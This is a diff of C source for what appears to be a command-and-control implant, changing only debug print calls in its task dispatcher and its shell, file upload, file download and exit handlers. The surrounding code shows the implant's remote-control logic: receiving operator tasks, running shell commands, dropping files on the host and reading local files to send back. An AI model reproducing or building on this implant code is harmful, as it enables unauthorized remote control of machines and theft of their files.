@@ -23,7 +23,7 @@ VOID CommandDispatcher()
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand = 0;
 
-    _tprintf( "Command Dispatcher..." );
+    puts( "Command Dispatcher..." );
 
     do
     {
@@ -48,7 +48,7 @@ VOID CommandDispatcher()
 
                 if ( TaskCommand != COMMAND_NO_JOB )
                 {
-                    _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < REVNT_COMMAND_LENGTH; FunctionCounter++ )
@@ -62,9 +62,9 @@ VOID CommandDispatcher()
                     }
 
                     if ( ! FoundCommand )
-                        _tprintf( "Command not found !!" );
+                        puts( "Command not found !!" );
 
-                } else _tprintf( "Is COMMAND_NO_JOB" );
+                } else puts( "Is COMMAND_NO_JOB" );
 
             } while ( Parser.Length > 4 );
 
@@ -77,7 +77,7 @@ VOID CommandDispatcher()
         }
         else
         {
-            _tprintf( "Transport: Failed" );
+            puts( "Transport: Failed" );
             break;
         }
 
@@ -88,7 +88,7 @@ VOID CommandDispatcher()
 
 VOID CommandShell( PPARSER Parser )
 {
-    _tprintf( "Command::Shell" );
+    puts( "Command::Shell" );
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -135,7 +135,7 @@ VOID CommandShell( PPARSER Parser )
 
 VOID CommandUpload( PPARSER Parser )
 {
-    _tprintf( "Command::Upload" );
+    puts( "Command::Upload" );
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -147,19 +147,19 @@ VOID CommandUpload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    _tprintf( "FileName => %s (FileSize: %d)", FileName, FileSize );
+    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
     if ( hFile == INVALID_HANDLE_VALUE )
     {
-        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
     if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL ) )
     {
-        _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
+        printf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
         goto Cleanup;
     }
 
@@ -175,7 +175,7 @@ Cleanup:
 
 VOID CommandDownload( PPARSER Parser )
 {
-    _tprintf( "Command::Download",0);
+    puts( "Command::Download");
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -187,12 +187,12 @@ VOID CommandDownload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    _tprintf( "FileName => %s", FileName );
+    printf( "FileName => %s", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
-        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -201,7 +201,7 @@ VOID CommandDownload( PPARSER Parser )
 
     if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
     {
-        _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
+        printf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -228,7 +228,7 @@ CleanupDownload:
 
 VOID CommandExit( PPARSER Parser )
 {
-    _tprintf( "Command::Exit" );
+    puts( "Command::Exit" );
 
     ExitProcess( 0 );
 }
